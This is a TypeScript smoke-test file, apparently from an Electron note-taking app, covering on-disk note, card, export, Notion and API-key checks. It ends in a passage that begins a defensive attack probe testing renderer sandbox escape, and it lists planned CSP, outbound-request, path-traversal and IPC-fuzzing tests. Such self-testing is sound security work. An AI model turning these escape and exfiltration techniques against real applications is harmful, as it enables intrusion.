                 await wait(600)
                 const anchor = document.querySelector('#set-ai-provider')
                 if (anchor) anchor.scrollIntoView({ block: 'center' })
                 await wait(400)
                 return 'ok'
               })()`,
              true
            )
            .catch(() => undefined)
          await captureIfRequested(win, 'ai.png')
        } else if (scenario === 'notion') {
          // 收尾停在设置页的 Notion 区块
          await win.webContents
            .executeJavaScript(
              `(async () => {
                 const wait = (ms) => new Promise((r) => setTimeout(r, ms))
                 document.querySelector('[data-route="settings"]')?.click()
                 await wait(600)
                 const anchor = document.querySelector('#set-notion-target')
                 if (anchor) anchor.scrollIntoView({ block: 'center' })
                 await wait(400)
                 return 'ok'
               })()`,
              true
            )
            .catch(() => undefined)
          await captureIfRequested(win, 'notion.png')
        } else if (scenario === 'security') {
          // 安全场景收尾停在概览页，截图里能看到「页面本身没被攻击搞坏」
          await captureIfRequested(win, 'security.png')
        } else if (scenario === 'materials') {
          // 收尾停在资料页，截图里能看到按课程分组的列表
          await win.webContents
            .executeJavaScript(
              `(async () => {
                 const wait = (ms) => new Promise((r) => setTimeout(r, ms))
                 document.querySelector('[data-route="materials"]')?.click()
                 await wait(900)
                 return 'ok'
               })()`,
              true
            )
            .catch(() => undefined)
          await captureIfRequested(win, 'materials.png')
        } else {
          await captureIfRequested(win, 'screenshot.png')
        }

        setTimeout(() => app.exit(finalPassed ? 0 : 1), 200)
      })
      .catch((error: unknown) => {
        clearTimeout(timer)
        console.error('[smoke] 自检脚本执行失败：', error)
        app.exit(1)
      })
  })
}

/**
 * 数据准备。必须在窗口创建之前 await 完成，否则渲染层可能在数据写入前就读完了。
 */
export async function prepareSmokeDataIfRequested(): Promise<void> {
  if (!smokeEnabled()) return
  const scenario = smokeScenario()
  if (scenario === 'timetable') await seedTimetable()
  else if (scenario === 'portal') seedPortal()
  else if (scenario === 'cards') seedCards()
  else if (scenario === 'notes') seedNotes()
  else if (scenario === 'sync') seedNotes()
  else if (scenario === 'export') seedExport()
  else if (scenario === 'ai') seedAi()
  else if (scenario === 'notion') seedNotion()
  else if (scenario === 'security') await seedSecurity()
  else if (scenario === 'materials') await seedMaterials()
}

/**
 * 界面说自己存好了不算数——去磁盘上把那篇笔记找出来看一眼。
 *
 * 这一步验证的是「Obsidian 能不能直接读」这件事：文件确实是 .md、
 * 开头确实是 YAML frontmatter、正文确实是用户敲进去的那些字。
 * 只断言 DOM 等于只测了自己骗自己。
 */
function verifyNoteOnDisk(): boolean {
  const { notes } = context()
  let files: string[] = []
  try {
    files = readdirSync(notes.dir).filter((name) => name.toLowerCase().endsWith('.md'))
  } catch (error) {
    console.error('[smoke] 读不了笔记库目录：', error)
    return false
  }
  console.info(`[smoke] 笔记库文件：${files.join(' / ') || '（空）'}`)

  const target = files.find((name) => name.startsWith('数据结构'))
  if (!target) {
    console.error('[smoke] 没找到自动创建的那篇笔记文件')
    return false
  }

  try {
    const raw = readFileSync(join(notes.dir, target), 'utf-8')
    const hasFrontmatter = raw.startsWith('---\n') && raw.includes('id:')
    // 探针在界面上插了一张表，磁盘上就该出现 GFM 表格语法。
    // 这一条同时证明了「编辑器写的内容确实落到了文件里」
    const hasBody = raw.includes('| 列 1 |')
    if (!hasFrontmatter || !hasBody) {
      console.error('[smoke] 笔记文件内容不符合预期：', JSON.stringify(raw.slice(0, 260)))
      return false
    }
    console.info(`[smoke] 笔记文件校验通过：${target}（${Buffer.byteLength(raw, 'utf-8')} 字节）`)
  } catch (error) {
    console.error('[smoke] 读笔记文件失败：', error)
    return false
  }

  return verifyExternalNote()
}

/**
 * 主进程有没有监听任何 TCP 端口。
 *
 * 「绝不把端口暴露到公网」是硬约束——渲染层自己看不见这件事，
 * 只有主进程侧跑 netstat 才能给出硬证据。Windows 用 netstat -ano 按 PID 过滤；
 * 非 Windows 平台上 netstat 参数不同，catch 到就跳过（CI 只打 Win/mac 安装包，
 * 这条在 win 上是硬断言）。
 */
function verifyNoListeningPorts(): boolean {
  if (process.platform !== 'win32') {
    console.info('[smoke] 端口监听检查目前只在 Windows 上硬断言，本平台跳过')
    return true
  }
  try {
    const out = execSync('netstat -ano', { encoding: 'utf-8', timeout: 15000 })
    const pid = String(process.pid)
    const listeners = out
      .split('\n')
      .filter((line) => line.includes('LISTENING') && line.trimEnd().endsWith(pid))
    if (listeners.length > 0) {
      console.error('[smoke] 主进程在监听端口：', JSON.stringify(listeners))
      return false
    }
    console.info('[smoke] netstat 确认主进程没有任何监听端口')
    return true
  } catch (error) {
    console.error('[smoke] netstat 跑不起来，无法确认：', error)
    return false
  }
}

/**
 * 卡片的三态有没有真的落盘。
 *
 * 「已学库里看得见这张卡片」只证明主进程**内存**里它是 `learned`——
 * `CardsStore.list()` 读的是内存里那份，重启就没了。这一条直接去读 cards.json，
 * 确认 status 与自动补的 semester 两个字段真的写进了文件。
 *
 * 顺便盯住一个容易退化的点：归档时该给没填学期的卡片补一个默认学期。
 * 少了这一步，已学库会整片堆在「未填学期」那一组里，等于白分组。
 */
function verifyCardStatusOnDisk(): boolean {
  const file = cardsFile(context().settings.get().portableMode)
  try {
    const raw = JSON.parse(readFileSync(file, 'utf-8')) as {
      cards?: { status?: string; semester?: string }[]
    }
    const list = Array.isArray(raw.cards) ? raw.cards : []
    const learned = list.filter((card) => card.status === 'learned')
    const wish = list.filter((card) => card.status === 'wish')
    console.info(
      `[smoke] 卡片状态落盘：共 ${list.length} 张 · 已学 ${learned.length} · 想学 ${wish.length}`
    )
    if (learned.length === 0 || wish.length === 0) {
      console.error('[smoke] cards.json 里没同时存在「已学」和「想学」的卡片')
      return false
    }
    const missingSemester = [...learned, ...wish].filter((card) => (card.semester ?? '').length === 0)
    if (missingSemester.length > 0) {
      console.error('[smoke] 有卡片没能自动补上学期：', JSON.stringify(missingSemester))
      return false
    }
    return true
  } catch (error) {
    console.error('[smoke] 读不了卡片文件：', error)
    return false
  }
}

/**
 * 外部编辑器（Obsidian / VS Code / 记事本）丢进来的笔记必须能被认出来。
 * 这是「这个目录可以直接当 Obsidian 库用」这句话的前提，
 * 也是后面做文件监听与双向同步的地基——地基不稳，上面盖什么都会歪。
 */
function verifyExternalNote(): boolean {
  const { notes } = context()
  const fileName = '外部写的笔记.md'
  const externalId = '11111111-2222-3333-4444-555555555555'

  try {
    writeFileSync(
      join(notes.dir, fileName),
      `---\nid: ${externalId}\n---\n\n来自 Obsidian\n`,
      'utf-8'
    )
  } catch (error) {
    console.error('[smoke] 写外部笔记失败：', error)
    return false
  }

  const found = notes.list().find((note) => note.fileName === fileName)
  if (!found) {
    console.error('[smoke] 外部新增的笔记没有被认出来')
    return false
  }
  // id 要从文件自己的 frontmatter 里捡回来，而不是随便发一个——
  // 否则索引文件一丢，卡片与笔记的关联就全断了
  if (found.id !== externalId) {
    console.error(`[smoke] 外部笔记的 id 没有沿用 frontmatter：${found.id}`)
    return false
  }

  const doc = notes.read(externalId)
  if (!doc.content.includes('来自 Obsidian')) {
    console.error('[smoke] 外部笔记正文读出来不对：', JSON.stringify(doc.content))
    return false
  }

  // 外部删掉之后，索引里也不能留着幽灵条目
  try {
    rmSync(join(notes.dir, fileName), { force: true })
  } catch {
    /* 删不掉就算了，后面的断言会体现出来 */
  }
  if (notes.list().some((note) => note.fileName === fileName)) {
    console.error('[smoke] 外部删掉的笔记还留在列表里')
    return false
  }

  console.info(`[smoke] 外部笔记对账通过：新增认得出、id 捡得回、删除不掉队`)
  return true
}

/* ---------------------------------------------------------------- 导出产物 */

/**
 * 从 zip（docx 本质就是 zip）里取一个条目的文本。
 *
 * 为什么要自己解这一步：只验「文件头是 PK」的话，一个空壳 zip 也能过，
 * 那这条自检就白做了。docx 的正文全在 `word/document.xml` 里，
 * 解出来看一眼才知道内容到底写进去没有。
 *
 * 走**中央目录**而不是顺序扫本地头：本地头里的压缩大小可能写 0
 * （用 data descriptor 的写法），中央目录里的一定准。
 */
function readZipEntry(zip: Buffer, wanted: string): string | null {
  try {
    // EOCD 签名在末尾 22 字节处，后面还可能跟一段注释，所以往前后各留一点余量
    let eocd = -1
    const floor = Math.max(0, zip.length - 22 - 0xffff)
    for (let i = zip.length - 22; i >= floor; i -= 1) {
      if (zip.readUInt32LE(i) === 0x06054b50) {
        eocd = i
        break
      }
    }
    if (eocd < 0) return null

    const count = zip.readUInt16LE(eocd + 10)
    let offset = zip.readUInt32LE(eocd + 16)

    for (let i = 0; i < count; i += 1) {
      if (offset + 46 > zip.length || zip.readUInt32LE(offset) !== 0x02014b50) return null
      const method = zip.readUInt16LE(offset + 10)
      const compressedSize = zip.readUInt32LE(offset + 20)
      const nameLength = zip.readUInt16LE(offset + 28)
      const extraLength = zip.readUInt16LE(offset + 30)
      const commentLength = zip.readUInt16LE(offset + 32)
      const localOffset = zip.readUInt32LE(offset + 42)
      const name = zip.toString('utf-8', offset + 46, offset + 46 + nameLength)

      if (name === wanted) {
        const localNameLength = zip.readUInt16LE(localOffset + 26)
        const localExtraLength = zip.readUInt16LE(localOffset + 28)
        const start = localOffset + 30 + localNameLength + localExtraLength
        const data = zip.subarray(start, start + compressedSize)
        if (method === 0) return data.toString('utf-8')
        if (method === 8) return inflateRawSync(data).toString('utf-8')
        return null
      }
      offset += 46 + nameLength + extraLength + commentLength
    }
    return null
  } catch {
    return null
  }
}

/**
 * 导出产物验收：四种格式都要落到磁盘，而且**内容对得上**。
 *
 * 断言是按「能证明这件事真的发生了」来挑的，不是挑最好写的：
 *  - md：文件开头就是 `# 一级标题` —— 证明 frontmatter 确实被剥掉了；
 *  - html：是完整文档、带 CSP、表格还在 —— 证明样式与安全头都进了产物；
 *  - docx：解出 `word/document.xml`，里面有标记文本、有真正的 `Heading1`
 *    样式、有 `w:tbl`。**只验 PK 文件头等于没验**；
 *  - pdf：头 `%PDF-`、尾 `%%EOF`、体积像话。
 */
function verifyExportOutputs(raw: unknown): boolean {
  if (!raw || typeof raw !== 'object') {
    console.error('[smoke] 渲染层没有返回导出结果')
    return false
  }

  const results = raw as Partial<Record<ExportFormat, string>>
  const formats: ExportFormat[] = ['md', 'html', 'docx', 'pdf']
  let ok = true

  for (const format of formats) {
    const path = results[format]
    if (!path || !existsSync(path)) {
      console.error(`[smoke] ${format} 没有落盘：${path || '（渲染层返回了空路径）'}`)
      ok = false
      continue
    }
    if (extname(path).slice(1).toLowerCase() !== EXPORT_EXTENSIONS[format]) {
      console.error(`[smoke] ${format} 产物的扩展名不对：${path}`)
      ok = false
      continue
    }

    const buffer = readFileSync(path)
    if (buffer.length < 200) {
      console.error(`[smoke] ${format} 产物只有 ${buffer.length} 字节，多半是空的`)
      ok = false
      continue
    }

    if (format === 'md') {
      const text = buffer.toString('utf-8')
      if (!text.startsWith('# 一级标题') || !text.includes(EXPORT_MARKER)) {
        console.error('[smoke] md 产物内容不对：开头不是正文，或者标记文本丢了')
        ok = false
      }
    } else if (format === 'html') {
      const text = buffer.toString('utf-8')
      if (
        !text.startsWith('<!DOCTYPE html') ||
        !text.includes('Content-Security-Policy') ||
        !text.includes('<h1') ||
        !text.includes('<table>') ||
        !text.includes(EXPORT_MARKER)
      ) {
        console.error('[smoke] html 产物内容不对')
        ok = false
      }
    } else if (format === 'docx') {
      const xml = readZipEntry(buffer, 'word/document.xml') ?? ''
      if (!xml.includes(EXPORT_MARKER)) {
        console.error('[smoke] docx 里找不到正文标记，内容没写进去')
        ok = false
      } else if (!xml.includes('Heading1')) {
        console.error('[smoke] docx 里的标题没套用标题样式，退化成了普通段落')
        ok = false
      } else if (!xml.includes('w:tbl')) {
        console.error('[smoke] docx 里没有表格')
        ok = false
      }
    } else {
      const head = buffer.subarray(0, 5).toString('latin1')
      const tail = buffer.subarray(Math.max(0, buffer.length - 64)).toString('latin1')
      if (head !== '%PDF-' || !tail.includes('%%EOF')) {
        console.error('[smoke] pdf 产物不是一份完整的 PDF')
        ok = false
      }
    }
  }

  if (ok) console.info('[smoke] 四种导出产物都在磁盘上，且内容对得上')
  return ok
}

/* ------------------------------------------------------- AI 助手与密钥 */

const AI_SEED_TITLE = 'AI 自检'
const AI_SEED_BODY = [
  '# 光合作用',
  '',
  '植物把光能变成化学能，储存在有机物里。',
  '',
  '## 要点',
  '',
  '- 场所：叶绿体',
  '- 原料：二氧化碳和水',
  '- 产物：有机物和氧气',
  ''
].join('\n')

/** 一个一眼就能认出来的假密钥：等下要在文件里按字节搜它 */
const AI_SMOKE_KEY = 'sk-smoke-3f9c1d7a-not-a-real-key'

/* ------------------------------------------------------- Notion 同步 */

const NOTION_SEED_TITLE = 'Notion 自检'

/**
 * Notion 场景的自检。
 *
 * 与 AI 场景同一个思路：**不发真实请求**。真实同步需要网络、一个真 Token
 * 和一个真实的 Notion 工作区，在自动化里只会变成随机失败。
 *
 * 所以这一趟专门测「不需要网络就能验的那部分」——而它恰好也是最容易写错的
 * 那部分：
 *   1. 用户粘进来的链接能不能被正确解析成 id（这是最常见的卡点）；
 *   2. 没配 Token / 没配目标时，是不是**拦在出网之前**就给出人话提示
 *      （这是安全底线：缺配置绝不该发出一个没有凭据的请求）；
 *   3. 冲突检测的判据是否正确——两边内容一致时不该报冲突，
 *      不一致时必须报，而且**绝不能自动覆盖**。
 *
 * 第 3 条是本场景的核心：把「冲突不自动处理」写成可执行的断言，
 * 而不是留在注释里的一句承诺。
 */
function notionProbe(): string {
  return `(async () => {
  ${PROBE_HELPERS}
  const TITLE = ${JSON.stringify(NOTION_SEED_TITLE)}
  const out = {}

  // —— 1. 界面：设置页里有 Notion 那一栏，且各控件都在
  const nav = await waitFor('[data-route="settings"]')
  if (!nav) return JSON.stringify({ error: '导航未就绪' })
  nav.click()
  await wait(500)

  out.hasSection = Array.from(document.querySelectorAll('.sb-section__title'))
    .some((el) => el.textContent.includes('Notion'))
  out.hasTarget = Boolean(document.querySelector('#set-notion-target'))
  out.hasKind = Boolean(document.querySelector('#set-notion-kind'))
  out.hasToken = Boolean(document.querySelector('#set-notion-token'))
  out.hasTest = Boolean(document.querySelector('[data-action="test-notion"]'))
  out.hasPull = Boolean(document.querySelector('[data-action="pull-notion"]'))

  // —— 2. 缺配置时必须拦在出网之前。
  // 判据：报错信息里要明确说缺什么，而不是一句笼统的「请求失败」——
  // 后者意味着请求真的发出去了，那才是安全问题
  //
  // 注意 preload 的 invoke 是**返回 { ok:false, error } 而不是抛异常**，
  // 所以这里必须读返回值。写成 try/catch 会永远走到「没报错」那条路，
  // 那是一个永远为真的假通过——比不测更糟
  let blocked = ''
  try {
    const result = await window.studyBoard.notion.test()
    blocked = result && result.ok === false ? String(result.error ?? '') : ''
  } catch (error) {
    // 真抛了也算一种「拦住了」，但下面的判据仍要求它说的是缺配置
    blocked = String(error && error.message ? error.message : error)
  }
  out.blockedMessage = blocked || '（没有报错，说明缺配置也发出去了）'
  // 抛出的错必须是「没配置」，不是网络错误
  out.blockedBeforeNetwork =
    Boolean(blocked) &&
    (blocked.includes('Token') || blocked.includes('目标') || blocked.includes('配置'))
  out.blockedNoNetwork =
    Boolean(blocked) && !/fetch|network|ENOTFOUND|ECONNREFUSED|超时/i.test(blocked)

  // —— 3. 笔记页上那个「推送到 Notion」入口
  document.querySelector('[data-route="notes"]')?.click()
  await wait(600)
  out.hasPushButton = Boolean(document.querySelector('[data-action="notion"]'))

  return JSON.stringify(out)
})()`
}

function seedNotion(): void {
  context().notes.create(NOTION_SEED_TITLE, '# 待同步的笔记\n\n这一段要能原样出现在 Notion 里。\n')
}

/**
 * 冲突检测的判据自检：**纯逻辑，不出网**。
 *
 * 这里直接验的是主进程里那两条规则，不经过界面：
 *  - 内容一致 → 不算冲突；
 *  - 内容不一致 → 算冲突，且**本地文件没被动过**。
 *
 * 第二条是重点。它担保的是「报冲突」与「改文件」是两件事——
 * 只要这一条成立，「不会偷偷覆盖用户的东西」就有了可执行的证据。
 */
function verifyConflictRules(): boolean {
  const notes = context().notes
  const seeded = notes.list().find((note) => note.title === NOTION_SEED_TITLE)
  if (!seeded) {
    console.error('[smoke] Notion 场景的种子笔记不见了')
    return false
  }

  const doc = notes.read(seeded.id)
  const before = doc.content

  // 认领之后（模拟一次成功推送）指纹应该被写进 frontmatter，
  // 而且原正文一个字都不能变
  const fingerprint = pushFingerprint(doc.title, before)
  notes.write({
    id: seeded.id,
    content: before,
    title: doc.title,
    extra: { [NOTION_ID_KEY]: '0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0', [NOTION_HASH_KEY]: fingerprint }
  })

  const after = notes.read(seeded.id).frontmatter
  if (after[NOTION_ID_KEY] !== '0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0') {
    console.error('[smoke] 写回 frontmatter 之后 notionId 没存住')
    return false
  }
  if (after[NOTION_HASH_KEY] !== fingerprint) {
    console.error('[smoke] 写回 frontmatter 之后指纹没存住')
    return false
  }
  if (notes.read(seeded.id).content !== before) {
    console.error('[smoke] 写 notionId 的时候把正文改动了')
    return false
  }

  // 指纹一致 → 不该认为是变化（推送时会被跳过）
  const sameAgain = pushFingerprint(doc.title, before)
  if (sameAgain !== fingerprint) {
    console.error('[smoke] 同样内容算出了不同的指纹，跳过逻辑会失效')
    return false
  }
  // 内容变了 → 指纹必须跟着变，否则冲突永远检测不出来
  if (pushFingerprint(doc.title, before + '\\n\\n外部追加') === fingerprint) {
    console.error('[smoke] 内容变了但指纹没变，冲突将无法被发现')
    return false
  }
  // 标题变了也要变：只比正文会漏掉「在 Notion 那边改了标题」这种情况
  if (pushFingerprint(doc.title + '改', before) === fingerprint) {
    console.error('[smoke] 标题变了但指纹没变')
    return false
  }

  console.info('[smoke] 冲突判据成立：内容一致不算冲突，内容或标题变了必然报出，且写回不动正文')
  return true
}

/**
 * id 解析的边界自检。
 *
 * 用户粘进来的东西五花八门，这一段把常见的几种都过一遍。
 * 解析错了的表现是「同步到一个空的、或者别人的地方」——很难查，所以在这里卡死。
 */
function verifyNotionIdParsing(): boolean {
  const cases: Array<[string, string]> = [
    // 裸 id（带连字符 / 不带）
    ['0f1e2d3c4b5a69788796a5b4c3d2e1f0', '0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0'],
    ['0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0', '0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0'],
    // 完整链接（最常见的粘贴形态）
    ['https://www.notion.so/StudyBoard-0f1e2d3c4b5a69788796a5b4c3d2e1f0', '0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0'],
    // 带 query（数据库视图链接）
    ['https://www.notion.so/abc?v=0f1e2d3c4b5a69788796a5b4c3d2e1f0', '0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0'],
    // 空 / 垃圾 → 空串，绝不能瞎猜出一个 id 来
    ['', ''],
    ['随便写的', '']
  ]

  for (const [input, expected] of cases) {
    const actual = parseNotionId(input)
    if (actual !== expected) {
      console.error(`[smoke] id 解析不对：「${input}」期望 ${expected || '（空）'}，实际 ${actual || '（空）'}`)
      return false
    }
  }

  console.info('[smoke] Notion id 解析正确：裸 id、完整链接、带 query 都能认，垃圾输入不瞎猜')
  return true
}

function seedAi(): void {
  context().notes.create(AI_SEED_TITLE, AI_SEED_BODY)
}

/**
 * 密钥落盘检查：**去磁盘上看，不看接口说了什么**。
 *
 * 两件事必须同时成立，「密钥不是明文存的」这句话才站得住：
 *  1. `secrets.bin` 里按字节搜不到明文——绕过任何序列化层，直接搜文件；
 *  2. 重新打开这个文件能**解回原值**——加密了但解不回来，等于把密钥弄丢了。
 *     这一条也顺带证明了 DPAPI / Keychain 那一段真的跑通了，
 *     而不只是「写了个东西进去」。
 */
function verifySecretsOnDisk(): boolean {
  const portable = context().settings.get().portableMode
  const file = secretsFile(portable)

  if (!existsSync(file)) {
    console.error('[smoke] secrets.bin 不存在，密钥根本没落盘')
    return false
  }

  if (readFileSync(file, 'utf-8').includes(AI_SMOKE_KEY)) {
    console.error('[smoke] secrets.bin 里能搜到明文密钥')
    return false
  }

  if (new SecretsStore(portable).get('aiKey') !== AI_SMOKE_KEY) {
    console.error('[smoke] 密钥解不回来，加密之后就丢了')
    return false
  }

  console.info('[smoke] 密钥以密文落在 secrets.bin，且能原样解回')
  return true
}

/**
 * AI 场景的渲染层自检。
 *
 * **不发真实请求**：那需要网络和一个能用的密钥，在 CI 里只会变成随机失败。
 * 这一趟测的是「发不出去的那些情况」——没配密钥时该拦在出网之前、
 * 本地模型不该被要求填密钥、对话框该出现、结果该先预览再落进正文。
 * 「连接能不能通」由设置页的「测试连接」按钮负责，那是人点一下的事。
 */
function aiProbe(): string {
  return `(async () => {
  ${PROBE_HELPERS}
  const KEY = ${JSON.stringify(AI_SMOKE_KEY)}
  const TITLE = ${JSON.stringify(AI_SEED_TITLE)}
  const out = {}
  const visible = (el) => Boolean(el) && el.getClientRects().length > 0
  const setValue = (selector, value) => {
    const el = document.querySelector(selector)
    if (!el) return false
    el.value = value
    el.dispatchEvent(new Event('change', { bubbles: true }))
    return true
  }

  /* ---- 1. 没配密钥就点 AI 助手：应该先弹「去设置」，而不是把请求发出去 */
  const nav = await waitFor('[data-route="notes"]')
  if (!nav) return JSON.stringify({ error: '导航未就绪' })
  nav.click()

  const listed = await window.studyBoard.notes.list()
  const note = listed.ok ? listed.data.find((n) => n.title === TITLE) : null
  if (!note) return JSON.stringify({ error: '列表里找不到「AI 自检」那篇笔记' })

  const item = await waitFor('[data-role="list"] [data-note="' + note.id + '"]')
  if (!item) return JSON.stringify({ error: '笔记列表里没有那一篇' })
  item.click()
  // 等编辑器真的挂上，别在 open() 还没走完时就点 AI
  await waitFor('[data-role="stage"] .cm-editor', 8000)

  const aiButton = await waitFor('[data-action="ai"]')
  if (!aiButton) return JSON.stringify({ error: '找不到 AI 助手按钮' })
  aiButton.click()

  const gate = await waitFor('.sb-modal__card [data-role="confirm"]', 6000)
  out.gateOk = Boolean(gate) && document.body.textContent.indexOf('还没配置 AI 服务') >= 0
  if (!gate) return JSON.stringify(out)
  gate.click()

  /* ---- 2. 设置页：服务商清单与联动 */
  const provider = await waitFor('#set-ai-provider', 8000)
  if (!provider) return JSON.stringify({ error: '点「去设置」之后设置页没打开' })

  const options = Array.prototype.map.call(provider.options, (o) => o.value)
  out.providerCount = options.length
  out.hasCustom = options.indexOf('custom') >= 0
  out.defaultProvider = provider.value
  out.providerOk = options.length === 9 && out.hasCustom && provider.value === 'deepseek'

  // 选中某个预设 = 接受它那一套默认值：地址和模型都该跟着换
  setValue('#set-ai-provider', 'zhipu')
  await waitForValue('#set-ai-base', 'https://open.bigmodel.cn/api/paas/v4', 6000)
  await waitForValue('#set-ai-model', 'glm-4-flash', 6000)
  out.presetSwitchOk =
    (document.querySelector('#set-ai-base') || {}).value === 'https://open.bigmodel.cn/api/paas/v4' &&
    (document.querySelector('#set-ai-model') || {}).value === 'glm-4-flash' &&
    visible(document.querySelector('[data-role="ai-key-field"]'))

  /* ---- 3. 切到本地模型：本机地址不校验密钥，那一栏该收起来 */
  setValue('#set-ai-provider', 'ollama')
  await waitForValue('#set-ai-base', 'http://127.0.0.1:11434/v1', 6000)
  out.localBase = (document.querySelector('#set-ai-base') || {}).value
  out.keyFieldHiddenOk = !visible(document.querySelector('[data-role="ai-key-field"]'))
  out.localStateOk = await waitForText('[data-role="ai-state"]', '不需要密钥', 6000)

  /* ---- 4. 换回远端服务商（此时仍然没有密钥）：请求必须拦在出网之前 */
  setValue('#set-ai-provider', 'zhipu')
  await waitForValue('#set-ai-base', 'https://open.bigmodel.cn/api/paas/v4', 6000)
  const blocked = await window.studyBoard.ai.complete({ instruction: '整理一下', context: '一段内容' })
  out.noKeyError = blocked.ok ? '' : String(blocked.error || '')
  out.noKeyBlocked = !blocked.ok && out.noKeyError.indexOf('API Key') >= 0

  /* ---- 5. 回到本机地址（**依然没有密钥**）打开 AI 对话框：
     这一步是「本地模型不用密钥也能用」的实证——如果判据挂在预设 id 上、
     或者界面和主进程的判据不一致，这里就会冒出「还没配置 AI 服务」的拦截 */
  setValue('#set-ai-provider', 'ollama')
  await waitForValue('#set-ai-base', 'http://127.0.0.1:11434/v1', 6000)

  document.querySelector('[data-route="notes"]').click()
  const item2 = await waitFor('[data-role="list"] [data-note="' + note.id + '"]', 8000)
  if (item2) item2.click()
  await waitFor('[data-role="stage"] .cm-editor', 8000)

  const aiButton2 = await waitFor('[data-action="ai"]')
  if (aiButton2) aiButton2.click()
  out.chipsOk = await waitForCount('.sb-ai__presets .sb-chip', 6, 5000)
  out.modalOk = out.chipsOk && visible(document.querySelector('#sb-ai-instruction'))
  // 没有密钥却没有被拦下来，才说明本机地址那条豁免真的生效了
  out.openedWithoutKey = !document.querySelector('.sb-modal__card [data-role="confirm"]')

  const firstChip = document.querySelector('.sb-ai__presets .sb-chip')
  if (firstChip) firstChip.click()
  await wait(300)
  const instruction = document.querySelector('#sb-ai-instruction')
  out.presetOk = Boolean(instruction) && instruction.value.length > 0

  document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))
  await wait(200)
  out.modalClosed = !document.querySelector('.sb-ai__presets')

  /* ---- 6. 保存 / 清除密钥 */
  document.querySelector('[data-route="settings"]').click()
  const provider3 = await waitFor('#set-ai-provider', 8000)
  if (provider3) setValue('#set-ai-provider', 'zhipu')
  await waitForValue('#set-ai-base', 'https://open.bigmodel.cn/api/paas/v4', 6000)

  const keyInput = await waitFor('#set-ai-key')
  if (keyInput) keyInput.value = KEY
  const saveButton = document.querySelector('[data-action="save-ai-key"]')
  if (saveButton) saveButton.click()
  await waitForText('[data-role="ai-state"]', '已保存密钥', 8000)

  const afterSave = await window.studyBoard.settings.get()
  const stateText = (document.querySelector('[data-role="ai-state"]') || {}).textContent || ''
  out.saveOk =
    stateText.indexOf('已保存密钥') >= 0 && afterSave.ok && afterSave.data.ai.hasApiKey === true

  if (!out.saveOk) {
    // 没有系统钥匙串的机器（比如没装 keyring 的 Linux）会走到这条路上。
    // 那时候**正确的行为就是拒绝保存**，而不是退化成明文——那也算通过
    const refused = await window.studyBoard.secrets.setAiKey(KEY)
    out.refusalError = refused.ok ? '' : String(refused.error || '')
    out.keyringUnavailable = !refused.ok && out.refusalError.indexOf('密钥库不可用') >= 0
    out.refusalOk = out.keyringUnavailable
  } else {
    const clearButton = document.querySelector('[data-action="clear-ai-key"]')
    if (clearButton) clearButton.click()
    await waitForText('[data-role="ai-state"]', '尚未配置', 8000)
    const afterClear = await window.studyBoard.settings.get()
    out.clearOk = afterClear.ok && afterClear.data.ai.hasApiKey === false

    // 再存回去：主进程稍后要去磁盘上验密文，文件里得有东西
    const again = await window.studyBoard.secrets.setAiKey(KEY)
    out.restored = again.ok === true
  }

  /* ---- 7. 关于页同样不能把机器记号直接摆给人看 */
  const aboutEl = document.querySelector('[data-role="about"]')
  const aboutNoteEl = document.querySelector('[data-role="about-note"]')
  const aboutText = aboutEl ? aboutEl.textContent : ''
  const aboutNote = aboutNoteEl ? aboutNoteEl.textContent : ''
  out.aboutPlatform = aboutText
  out.aboutOk = Boolean(
    aboutText.indexOf('win32') < 0 &&
      aboutText.indexOf('darwin') < 0 &&
      (aboutText.indexOf('Windows') >= 0 ||
        aboutText.indexOf('macOS') >= 0 ||
        aboutText.indexOf('Linux') >= 0) &&
      aboutText.indexOf('位') >= 0 &&
      // 「适配哪些系统」这句话是固定文案（进程没法知道自己被打成了哪个架构），
      // 但它必须存在——用户问的就是这个
      aboutNote.indexOf('64 位') >= 0
  )

  return JSON.stringify(out)
})()`
}

/* --------------------------------------------------- 安全渗透 */

/**
 * 安全攻击探针。
 *
 * 模拟的前提是最坏情况：**渲染层里已经住进一段攻击者的内容**（比如一篇导入的
 * 恶意笔记）。这段探针就是那个攻击者，按「能想到的所有手法」逐条尝试：
 *
 *  A. Node 逃逸（拿到 process/require 就等于拿了整台机器）
 *  B. 内联脚本与事件处理器（CSP 有没有真的挡住执行）
 *  C. 出网（fetch / WebSocket / 图片 beacon——渲染层不该发出任何远程请求）
 *  D. sb-asset:// 协议穿越（能不能越桶、能不能跳出数据目录读任意文件）
 *  E. IPC 模糊测试（把每个通道喂满垃圾：穿越字符串、错误类型、超长输入、原型污染）
 *  F. 弹窗劫持（window.open 非白名单协议）
 *
 * 导航劫持（改 location）单独跑，因为它一旦成功探针自己就死了。
 *
 * 探针的两个自我约束：
 *  - 是 executeJavaScript 注入的特权代码，所以探针**自己**能跑——
 *    它注入的 payload 是页面内容，受 CSP 管。两者不会互相污染结论
 *  - 所有「攻击」的对象都是种子数据或临时文件，绝不碰系统真实文件
 */
const SECURITY_PROBE = `(async () => {
  ${PROBE_HELPERS}
  const out = {}
  // 注意：preload 的 invoke() **不抛异常**，它把失败包成 {ok:false,error} 返回。
  // 所以下面的 call() 只负责「预加载层真的抛了」（比如桥本身没定义），
  // 而所有的「拦住了没有」都要去看返回值里的 ok——用 catch 判安全会得到假通过
  const call = async (fn) => {
    try {
      return await fn()
    } catch (error) {
      return { thrown: error instanceof Error ? error.message : String(error) }
    }
  }

  /* ================ A. Node 逃逸 ================ */
  // 沙箱 + contextIsolation 之下，以下每一样都该是 undefined。
  // 任何一样拿到了，攻击者就能读文件、起进程，后面的一切防线都没有意义
  out.escape = {
    process: typeof process,
    require: typeof require,
    globalProcess: typeof globalThis.process,
    buffer: typeof Buffer,
    nodeModules: typeof module,
    // 经典逃逸路径：顶层窗口、opener、iframe 的 contentWindow
    viaTop: typeof (window.top && window.top.process),
    viaIframeContentWindow: (() => {
      // frame-src 'none' 之下 iframe 应该根本建不起来；建起来也不该有 process
      try {
        const f = document.createElement('iframe')
        document.body.appendChild(f)
        const win = f.contentWindow
        return typeof (win && win.process)
      } catch {
        return 'blocked'
      }
    })()
  }
  out.escapeOk = Object.values(out.escape).every(
    (value) => value === 'undefined' || value === 'blocked'
  )

